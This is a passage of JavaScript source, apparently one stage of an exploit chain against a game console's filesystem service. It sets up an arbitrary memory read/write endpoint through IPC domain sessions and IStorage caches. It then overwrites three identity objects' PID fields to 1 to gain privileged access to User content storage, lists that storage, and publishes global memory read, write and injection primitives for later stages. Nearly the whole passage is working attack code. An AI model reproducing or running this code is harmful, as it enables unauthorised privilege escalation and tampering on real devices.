        var canonicalDataHeader = cacheEntry(dataOffset, array);
        await logicalWrite(dataOffset, cacheEntry(0, array), "retained canonical control descriptor");
        var controlArray = await logicalRead(0, 1440, "retained canonical control readback");
        if (AnalysisBytes.readU64LE(controlArray, 0) !== 0n || AnalysisBytes.readU64LE(controlArray, 8) !== 0x4000n || controlArray[16] !== 0 || !AnalysisBytes.equal(controlArray.slice(dataEntryOffset, dataEntryOffset + 48), canonicalDataHeader)) throw new Error("retained two-bucket descriptors are not canonical");
        retainedEndpoint = {
            array: array,
            owner: owner,
            arrayLength: 1440,
            dataOffset: dataOffset,
            dataEntryOffset: dataEntryOffset,
            scratchOffset: scratchOffset,
            pointer: array,
            ownerBefore: layout.ownerBytes.slice(),
            ready: false,
            canonical: true
        };
        await setRetainedPointer(owner);
        var ownerBefore = await logicalRead(dataOffset, 120, "retained owner precondition");
        if (AnalysisBytes.readU64LE(ownerBefore, 32) !== BigInt(addressPlan.storageSize) || AnalysisBytes.readU64LE(ownerBefore, 40) !== 0x4000n || AnalysisBytes.readU64LE(ownerBefore, 72) !== BigInt(array) || AnalysisBytes.readU64LE(ownerBefore, 80) !== 0x5A0n || AnalysisBytes.readU32LE(ownerBefore, 88) !== 10 || AnalysisBytes.readU64LE(ownerBefore, 96) !== 14n) throw new Error("retained owner changed before cache-loop disable");
        await logicalWrite(dataOffset + 88, [ 0, 0, 0, 0 ], "retained cache-loop disable");
        var ownerAfter = await logicalRead(dataOffset, 120, "retained owner zero-count readback");
        if (AnalysisBytes.readU64LE(ownerAfter, 32) !== BigInt(addressPlan.storageSize) || AnalysisBytes.readU64LE(ownerAfter, 40) !== 0x4000n || AnalysisBytes.readU64LE(ownerAfter, 72) !== BigInt(array) || AnalysisBytes.readU64LE(ownerAfter, 80) !== 0x5A0n || AnalysisBytes.readU32LE(ownerAfter, 88) !== 0 || AnalysisBytes.readU64LE(ownerAfter, 96) !== 14n) throw new Error("retained cache-loop count did not read back as zero");
        await setRetainedPointer(scratchAddress);
        if (!AnalysisBytes.equal(await logicalRead(dataOffset, 16, "retained post-disable scratch read"), originalScratch)) throw new Error("retained scratch changed after cache-loop disable");
        await logicalWrite(dataOffset, marker, "retained post-disable scratch write");
        if (!AnalysisBytes.equal(await controlRead(scratchOffset, 16), marker)) throw new Error("retained control channel missed the post-disable scratch write");
        await logicalWrite(dataOffset, originalScratch, "retained post-disable scratch restore");
        if (!AnalysisBytes.equal(await controlRead(scratchOffset, 16), originalScratch)) throw new Error("retained scratch restoration after disable differs");
        retainedEndpoint.ready = true;
        retainedEndpointReady = true;
        addressCopy = {
            ...addressCopy,
            retainedEndpointActive: true
        };
        await log("PROMOTION: retained two-bucket endpoint qualified array=0x" + array.toString(16) + " owner=0x" + owner.toString(16) + " dataOffset=0x" + dataOffset.toString(16) + " ownerCount=0 readback=true");
    }
    async function retireRetainedEndpoint() {
        var state = retainedEndpoint;
        if (!retainedEndpointReady || !state || !state.canonical || state.retired || !outcome.restored && !outcome.promoted) throw new Error("retained endpoint is not in a verified state");
        if (!outcome.restored) {
            for (const field of fields) {
                var currentIdentity = await readObject(field, "retained endpoint pre-retirement identity check");
                if (!field.expectedPromotedBytes || !AnalysisBytes.equal(currentIdentity, field.expectedPromotedBytes)) throw new Error(field.name + " changed before endpoint retirement");
            }
        }
        await setRetainedPointer(state.owner);
        var owner = await logicalRead(state.dataOffset, 120, "retained owner retirement check");
        if (AnalysisBytes.readU64LE(owner, 32) !== BigInt(addressPlan.storageSize) || AnalysisBytes.readU64LE(owner, 40) !== 0x4000n || AnalysisBytes.readU64LE(owner, 72) !== BigInt(state.array) || AnalysisBytes.readU64LE(owner, 80) !== 0x5A0n || AnalysisBytes.readU32LE(owner, 88) !== 0 || AnalysisBytes.readU64LE(owner, 96) !== 14n) throw new Error("retained owner no longer has the verified zero-count layout");
        state.ready = false;
        state.retired = true;
        outcome.addressCopy = {
            ...outcome.addressCopy,
            retainedEndpointRetired: true
        };
        await log("CACHE: retained endpoint retired logically; owner layout and " + "count zero verified");
        return {
            retired: true,
            addressCopy: outcome.addressCopy
        };
    }
    try {
        if (!domainSession || domainSession.rootObj !== verifiedIdentityTargets.domainId || !candidateHandle || !addressPlan || !addressPlan.lowerWindow) throw new Error("the verified root, candidate IStorage, or address plan is unavailable");
        for (var i = 0; i < fields.length; i++) {
            var field = fields[i];
            if (!field.beforeBytes || field.beforeBytes.length !== field.objectSize || !RootLayout.isCanonicalPointer(BigInt(field.object)) || field.pidOffset < 0 || field.pidOffset + 8 > field.objectSize || AnalysisBytes.readU64LE(field.beforeBytes, field.pidOffset) !== field.before) throw new Error(field.name + " stored identity snapshot is inconsistent");
            for (var prior = 0; prior < i; prior++) {
                var previous = fields[prior];
                if (field.object < previous.object + previous.objectSize && previous.object < field.object + field.objectSize) throw new Error(field.name + " overlaps the " + previous.name + " identity object");
            }
            var current = await readObject(field, "pre-write");
            if (!AnalysisBytes.equal(current, field.beforeBytes)) throw new Error(field.name + " object changed since the original verification");
            field.expectedPromotedBytes = field.beforeBytes.slice();
            AnalysisBytes.writeU64LE(field.expectedPromotedBytes, field.pidOffset, 1n);
            field.writeAttempted = false;
            field.writeResult = null;
        }
        await log("PROMOTION: all 3 exact object snapshots are fresh; " + "no protected filesystem command has been attempted");
        await installRetainedEndpoint(verifiedIdentityTargets.retainedCache);
        for (var ei = 0; ei < fields.length; ei++) {
            var endpointField = fields[ei];
            var endpointRead = await readObject(endpointField, "retained-endpoint freshness");
            if (!AnalysisBytes.equal(endpointRead, endpointField.beforeBytes)) throw new Error(endpointField.name + " object changed during retained endpoint installation");
        }
        await log("PROMOTION: retained endpoint reread all three original objects exactly");
        for (var wi = 0; wi < fields.length; wi++) {
            var target = fields[wi];
            if (target.before === 1n) {
                await log("PROMOTION: " + target.name + " PID already 1; no write needed");
                continue;
            }
            var pidAddress = target.object + target.pidOffset;
            var immediatelyBefore = await readObject(target, "before " + target.name + " write");
            if (!AnalysisBytes.equal(immediatelyBefore, target.beforeBytes)) throw new Error(target.name + " changed before its PID write");
            target.writeAttempted = true;
            await retainedWriteMemory(pidAddress, u64Bytes(1n), "retained PID write " + target.name);
            target.writeResult = {
                transport: 0,
                error: 0,
                storageOffset: retainedEndpoint.dataOffset
            };
            var after = await readObject(target, "after " + target.name + " write");
            var exactPromoted = AnalysisBytes.equal(after, target.expectedPromotedBytes);
            var changedOffsets = [];
            for (var di = 0; di < after.length && changedOffsets.length < 8; di++) {
                if (after[di] !== target.beforeBytes[di]) changedOffsets.push("0x" + di.toString(16));
            }
            await log("PROMOTION: " + target.name + " write route=retained-two-bucket storageOffset=0x" + retainedEndpoint.dataOffset.toString(16) + " pidAddress=0x" + pidAddress.toString(16) + " pidReadback=0x" + AnalysisBytes.readU64LE(after, target.pidOffset).toString(16) + " exactObject=" + exactPromoted + " changedOffsets=" + (changedOffsets.join(",") || "none"));
            if (!exactPromoted) throw new Error(target.name + " write did not produce the exact expected object");
        }
        for (var vi = 0; vi < fields.length; vi++) {
            var verifiedField = fields[vi];
            var promotedRead = await readObject(verifiedField, "promoted verification");
            if (!AnalysisBytes.equal(promotedRead, verifiedField.expectedPromotedBytes) || AnalysisBytes.readU64LE(promotedRead, verifiedField.pidOffset) !== 1n) throw new Error(verifiedField.name + " PID=1 full-object verification failed");
        }
        outcome.promoted = true;
        await log("PROMOTION: all three complete objects verified with PID=1");
        var openPacket = allocPage(8192);
        var openReply = sendDomainCmd(domainSession.handle, domainSession.rootObj, 110, openPacket, function() {
            write32(openPacket + 0x30n, 1n);
        }, 4);
        outcome.openTransport = openReply.transport;
        outcome.openResult = openReply.result;
        outcome.openObjects = openReply.objCount;
        var fsObjects = openReply.ok ? readDomainObjects(openPacket, openReply.objCount, 0) : [];
        contentFsObjectIds = fsObjects;
        await log("FINAL ACCESS: OpenContentStorageFileSystem(User=1) " + "transport=" + hex32(openReply.transport) + " result=" + hex32(openReply.result) + " domainObjects=" + openReply.objCount);
        if (!openReply.ok || openReply.transport !== 0 || openReply.result !== 0 || openReply.objCount !== 1) throw new Error("final User content-storage open failed");
        if (fsObjects.length !== 1 || !fsObjects[0]) throw new Error("OpenContentStorageFileSystem returned no IFileSystem object");
        outcome.openedUserFs = true;
        contentFsHandle = cloneObject(domainSession.handle, fsObjects[0]);
        if (!contentFsHandle) throw new Error("could not clone the returned User content filesystem");
        var listing = ipcListDirectory(contentFsHandle, "/", 3);
        outcome.listCount = listing.entries.length;
        outcome.listedUserRoot = listing.error === 0;
        outcome.listTransport = listing.readTransport;
        outcome.listResult = listing.error;
        outcome.listEntriesRead = listing.entriesRead;
        await log("FINAL ACCESS: User content-storage root listing transport=" + (listing.readTransport === null || listing.readTransport === undefined ? "not-run" : hex32(listing.readTransport)) + " result=" + hex32(listing.error) + " entriesRead=" + (listing.entriesRead === null ? "unknown" : listing.entriesRead) + " entries=" + listing.entries.length);
        for (var ei = 0; ei < listing.entries.length && ei < 12; ei++) {
            var entry = listing.entries[ei];
            await log("FINAL ACCESS: /" + entry.name + " type=" + entry.type + " size=" + entry.size);
        }
        if (listing.error !== 0) throw new Error("User content-storage root listing failed");
        outcome.userStorageTestPassed = true;
        globalThis.fspSrv = domainSession;
        globalThis.civFsMemory = Object.freeze({
            status: function() {
                return Object.freeze({
                    ready: !!retainedEndpointReady && !!retainedEndpoint?.ready && !globalThis.civFsPendingProbe,
                    array: retainedEndpoint?.array || 0,
                    owner: retainedEndpoint?.owner || 0,
                    candidateHandle: retainedEndpointReady ? candidateHandle : 0,
                    dataOffset: retainedEndpoint?.dataOffset || 0,
                    dataEntryOffset: retainedEndpoint?.dataEntryOffset || 0,
                    fsRoot: Object.freeze({
                        entry: verifiedIdentityTargets.domainLayout.entry,
                        domain: verifiedIdentityTargets.domainLayout.domain,
                        object: verifiedIdentityTargets.domainLayout.object,
                        manager: verifiedIdentityTargets.domainLayout.manager,
                        table: verifiedIdentityTargets.domainLayout.table,
                        rootVptr: verifiedIdentityTargets.domainLayout.rootVptr,
                        captureStart: verifiedIdentityTargets.domainLayout.captureStart,
                        captureEnd: verifiedIdentityTargets.domainLayout.captureEnd
                    })
                });
            },
            read: async function(address, length) {
                if (!outcome.promoted || !retainedEndpointReady || globalThis.civFsPendingProbe) throw new Error("FS memory endpoint is not verified");
                return retainedReadMemory(address, length, "follow-up FS read");
            },
            probeBoundedNativeRead: async function(address, length, alreadySelected) {
                return probeBoundedNativeRead(address, length, alreadySelected === true);
            },
            selectPointerBounded: function(address) {
                return selectRetainedPointerBounded(address);
            },
            writeSelectedBounded: function(address, bytes) {
                return probeBoundedNativeWrite(address, bytes, []);
            },
            probeBoundedNativeScratchWrite: function(bytes, cancelWorkers) {
                const address = retainedEndpoint.array + 1416;
                if (!Array.isArray(bytes) || bytes.length !== 16 || address < verifiedIdentityTargets.domainLayout.captureStart || address + 16 > verifiedIdentityTargets.domainLayout.captureEnd) throw new Error("owned scratch write target differs");
                const handles = cancelWorkers === true ? globalThis.civRoWorkers?.list?.map(item => item.handle) : [];
                if (!Array.isArray(handles) || cancelWorkers === true && handles.length !== 7) throw new Error("native scratch worker handles unavailable");
                return probeBoundedNativeWrite(address, bytes, handles);
            },
            parkRoWaitNative: function(cancelWorkers = true, parkSource = "event") {
                const row = globalThis.civRoOwned?.row;
                const event = globalThis.civRoEvent;
                const workers = globalThis.civRoWorkers?.list;
                const layout = verifiedIdentityTargets.domainLayout;
                if (!row || !event || workers?.length !== 7 || !Number.isSafeInteger(row.address) || row.address < layout.manager + 3400 || row.address + 136 > layout.manager + 3400 + 65536 || (row.address - layout.manager - 3400) % 136 !== 0 || retainedEndpoint.pointer !== row.address || !Number.isInteger(row.wait) || !Number.isInteger(event.sourceHandle)) throw new Error("RO park native preconditions differ");
                if (parkSource !== "event" && parkSource !== "worker") throw new Error("RO park native source differs");
                const park = parkSource === "worker" ? workers[0].source : event.sourceHandle;
                if (!Number.isInteger(park) || park < 32768 || park >= 268435456 || park === row.wait) throw new Error("RO park native handle differs");
                return probeBoundedNativeWrite(row.address + 48, [ park & 255, park >>> 8 & 255, park >>> 16 & 255, park >>> 24 & 255 ], cancelWorkers === true ? workers.map(item => item.handle) : []);
            },
            restoreRoWaitNative: function() {
                const row = globalThis.civRoOwned?.row;
                if (!row || retainedEndpoint.pointer !== row.address || !Number.isInteger(row.wait)) throw new Error("RO restore native preconditions differ");
                const wait = row.wait;
                return probeBoundedNativeWrite(row.address + 48, [ wait & 255, wait >>> 8 & 255, wait >>> 16 & 255, wait >>> 24 & 255 ], []);
            },
            retireBoundedNativeRead: function() {
                return retireBoundedNativeRead();
            },
            compareWrite: async function(address, before, after) {
                return compareWriteFsMemory(address, before, after, "follow-up FS compare-write");
            },
            injectRoHolder: async function(request) {
                return injectRoHolder(request);
            }
        });
        promotedSessionRetained = true;
        outcome.promotionRetained = true;
        await log("PROMOTION: User storage test passed; promoted session bound " + "as globalThis.fspSrv");
        if (typeof input.onElevated === "function") {
            outcome.downstreamStarted = true;
            downstreamSafeToRestore = false;
            await log("PROMOTION: running dependent stages before restoring PID fields");
            outcome.downstream = await input.onElevated({
                domainSession: domainSession,
                savedHandle: input.savedHandle || addressCopy.savedHandle,
                candidateHandle: candidateHandle,
                addressPlan: addressPlan,
                domainLayout: verifiedIdentityTargets.domainLayout,
                readFsMemory: (address, length, stageName) => retainedReadMemory(address, length, stageName || "dependent FS read"),
                writeFsMemoryUnverified: (address, bytes, stageName) => retainedWriteMemoryUnverified(address, bytes, stageName || "dependent FS one-shot write"),
                compareWriteFsMemory: compareWriteFsMemory,
                identityObjects: fields.map(function(field) {
                    return {
                        name: field.name,
                        object: field.object,
                        objectSize: field.objectSize,
                        pidOffset: field.pidOffset,
                        pid: field.before,
                        originalBytes: field.beforeBytes.slice(),
                        promotedBytes: field.expectedPromotedBytes.slice()
                    };
                })
            });
            outcome.downstreamCompleted = !!outcome.downstream?.completed;
            downstreamSafeToRestore = !!outcome.downstream?.safeToRestore;
            if (!outcome.downstreamCompleted || !downstreamSafeToRestore) throw new Error("dependent stages did not prove a safe handoff for PID restoration");
        }
    } catch (error) {
        outcome.error = error.message;
        await log("PROMOTION: failed: " + error.message);
    } finally {
        if (contentFsHandle) {
            try {
                var fsClose = Number(closeHandle(contentFsHandle)) >>> 0;
                outcome.fsCloseResult = fsClose;
                outcome.contentFsHandleClosed = fsClose === 0;
                await log("FINAL ACCESS: close User content filesystem rc=" + hex32(fsClose));
            } catch (error) {
                outcome.contentFsHandleClosed = false;
                outcome.contentFsHandleCloseError = String(error?.message || error);
                await log("FINAL ACCESS: close User content filesystem failed: " + outcome.contentFsHandleCloseError);
            }
            contentFsHandle = 0;
        }
        outcome.contentFsObjectCloseResults = [];
        for (const objectId of contentFsObjectIds) {
            try {
                const objectClose = closeDomainObject(domainSession.handle, objectId);
                outcome.contentFsObjectCloseResults.push(objectClose);
                if (objectClose !== 0) outcome.contentFsDomainObjectClosed = false;
            } catch (error) {
                outcome.contentFsDomainObjectClosed = false;
                outcome.contentFsObjectCloseResults.push(String(error?.message || error));
            }
        }
        if (outcome.contentFsObjectCloseResults.length) await log("FINAL ACCESS: close User filesystem objects rc=" + outcome.contentFsObjectCloseResults.map(value => typeof value === "number" ? hex32(value) : value).join(","));
        contentFsObjectIds = [];
        if (promotedSessionRetained) {
            addressCopy = {
                ...addressCopy,
                retainedEndpointActive: retainedEndpointReady
            };
            outcome.restored = false;
            outcome.promotionRetained = true;
            outcome.retainedEndpointActive = retainedEndpointReady;
            outcome.restoreFailureDetails = [];
            await log("PROMOTION: original PID fields intentionally remain at 1");
        } else if (outcome.promoted) {
            addressCopy = {
                ...addressCopy,
                retainedEndpointActive: retainedEndpointReady
            };
            outcome.restored = false;
            outcome.promotionRetained = false;
            outcome.pidsRemainPromoted = true;
            outcome.retainedEndpointActive = retainedEndpointReady;
            outcome.restoreFailureDetails = [];
            await log("PROMOTION: User storage test did not pass; PID fields " + "remain at 1 and handles will be closed");
        } else {
            var restoreOk = true;
            var restoreFailureDetails = [];
            if (retainedEndpointReady && !downstreamSafeToRestore) {
                restoreOk = false;
                restoreFailureDetails.push("dependent-stages-left-live-state-unverified");
                addressCopy = {
                    ...addressCopy,
                    workerStateSafe: false,
                    retainedEndpointUnsafe: true
                };
                await log("RESTORE: downstream phase did not prove all service, Loader, " + "and event state safe; preserve the retained endpoint for restart recovery");
            } else if (retainedEndpointReady) {
                var restoreStates = new Array(fields.length);
                for (var ci = 0; ci < fields.length; ci++) {
                    var checkField = fields[ci];
                    try {
                        var checkedBytes = await readObject(checkField, "retained restore check");
                        if (AnalysisBytes.equal(checkedBytes, checkField.beforeBytes)) {
                            restoreStates[ci] = "original";
                            await log("RESTORE: " + checkField.name + " already equals its original full-object snapshot");
                        } else if (checkField.expectedPromotedBytes && AnalysisBytes.equal(checkedBytes, checkField.expectedPromotedBytes)) {
                            restoreStates[ci] = "promoted";
                            await log("RESTORE: " + checkField.name + " matches the exact promoted object; retained restoration is required");
                        } else {
                            restoreStates[ci] = "unknown";
                            restoreOk = false;
                            restoreFailureDetails.push(checkField.name + ": changed-from-both-snapshots");
                            await log("RESTORE: " + checkField.name + " differs from both snapshots; no blind write issued");
                        }
                    } catch (readError) {
                        restoreStates[ci] = "unreadable";
                        restoreOk = false;
                        restoreFailureDetails.push(checkField.name + ": retained-read-failed: " + readError.message);
                        await log("RESTORE: " + checkField.name + " unreadable through retained endpoint: " + readError.message);
                    }
                }
                for (var ri = fields.length - 1; ri >= 0; ri--) {
                    var restoreField = fields[ri];
                    if (restoreStates[ri] !== "promoted") continue;
                    try {
                        var currentForRestore = await readObject(restoreField, "retained restore target check");
                        if (!restoreField.expectedPromotedBytes || !AnalysisBytes.equal(currentForRestore, restoreField.expectedPromotedBytes)) {
                            restoreOk = false;
                            restoreFailureDetails.push(restoreField.name + ": changed-before-restore-write");
                            await log("RESTORE: " + restoreField.name + " differs from the exact promoted snapshot; no write issued");
                            continue;
                        }
                        await retainedWriteMemory(restoreField.object + restoreField.pidOffset, u64Bytes(restoreField.before), "retained PID restoration " + restoreField.name);
                        var restoredBytes = await readObject(restoreField, "retained restore readback");
                        var exactRestore = AnalysisBytes.equal(restoredBytes, restoreField.beforeBytes);
                        await log("RESTORE: " + restoreField.name + " route=retained-two-bucket exactObject=" + exactRestore);
                        if (!exactRestore) restoreOk = false;
                        if (!exactRestore) restoreFailureDetails.push(restoreField.name + ": exact-object-readback-failed");
                        if (exactRestore) restoreStates[ri] = "original";
                    } catch (restoreError) {
                        restoreOk = false;
                        restoreFailureDetails.push(restoreField.name + ": restore-failed: " + restoreError.message);
                        await log("RESTORE: " + restoreField.name + " failed: " + restoreError.message);
                    }
                }
                for (var fi = 0; fi < fields.length; fi++) {
                    try {
                        var finalBytes = await readObject(fields[fi], "final retained restore verification");
                        var exact = AnalysisBytes.equal(finalBytes, fields[fi].beforeBytes);
                        if (!exact) {
                            restoreOk = false;
                            restoreFailureDetails.push(fields[fi].name + ": final-object-verification-failed");
                        }
                        await log("RESTORE: final " + fields[fi].name + " exactOriginalObject=" + exact);
                    } catch (finalReadError) {
                        restoreOk = false;
                        restoreFailureDetails.push(fields[fi].name + ": final-read-failed: " + finalReadError.message);
                        await log("RESTORE: final " + fields[fi].name + " read failed: " + finalReadError.message);
                    }
                }
                addressCopy = {
                    ...addressCopy,
                    retainedEndpointActive: true
                };
                await log("RESTORE: retained endpoint stays available until S21 cleanup " + "verifies retirement and closes the candidate storage handle");
            } else {
                if (retainedSetupStarted) {
                    restoreOk = false;
                    restoreFailureDetails.push("retained-endpoint-setup-partial");
                    if (activePlan !== addressPlan && addressCopy.workerStateSafe !== false) {
                        try {
                            await installPlan(addressPlan, "cache-retained-failure-inspection-window");
                        } catch (planError) {
                            await log("RESTORE: broad inspection mapping could not be reinstated: " + planError.message);
                        }
                    }
                    if (activePlan === addressPlan) {
                        for (var pi = 0; pi < fields.length; pi++) {
                            try {
                                var partialRead = await readObject(fields[pi], "retained setup failure inspection", addressPlan);
                                await log("RESTORE: " + fields[pi].name + " PID snapshot=" + (AnalysisBytes.equal(partialRead, fields[pi].beforeBytes) ? "original" : "changed/unknown"));
                            } catch (partialError) {
                                await log("RESTORE: " + fields[pi].name + " inspection failed: " + partialError.message);
                            }
                        }
                    }
                    addressCopy = {
                        ...addressCopy,
                        workerStateSafe: false,
                        retainedEndpointUnsafe: true
                    };
                    await log("RESTORE: retained setup was partial; candidate retirement and save cleanup are unsafe");
                } else {
                    for (var oi = 0; oi < fields.length; oi++) {
                        try {
                            var originalRead = await readObject(fields[oi], "no-write failure inspection", addressPlan);
                            var unchanged = AnalysisBytes.equal(originalRead, fields[oi].beforeBytes);
                            if (!unchanged) restoreOk = false;
                            if (!unchanged) restoreFailureDetails.push(fields[oi].name + ": original-object-changed-before-promotion");
                            await log("RESTORE: " + fields[oi].name + " exactOriginalObject=" + unchanged);
                        } catch (originalError) {
                            restoreOk = false;
                            restoreFailureDetails.push(fields[oi].name + ": original-object-inspection-failed: " + originalError.message);
                            await log("RESTORE: " + fields[oi].name + " inspection failed: " + originalError.message);
                        }
                    }
                }
            }
            outcome.restored = restoreOk;
            outcome.restoreFailureDetails = restoreFailureDetails;
            outcome.retainedEndpointActive = retainedEndpointReady;
            await log("RESTORE: PID result=" + (restoreOk ? "EXACT" : "FAILED; state is unsafe"));
        }
    }
    outcome.addressCopy = addressCopy;
    if (retainedEndpointReady && (outcome.restored || outcome.promoted && !outcome.promotionRetained)) outcome.retireRetainedEndpoint = retireRetainedEndpoint;
    return outcome;
}

function closeDomainObject(sessionHandle, objectId) {
    if (!sessionHandle || !objectId) return 4294967295;
    const packet = allocPage(8192);
    prepPacket(packet, 4, 8, []);
    write8(packet + 0x10n, 2n);
    write32(packet + 0x14n, BigInt(objectId));
    write32(packet + 0x1Cn, 0n);
    return Number(sendIPC(sessionHandle, packet)) >>> 0;
}
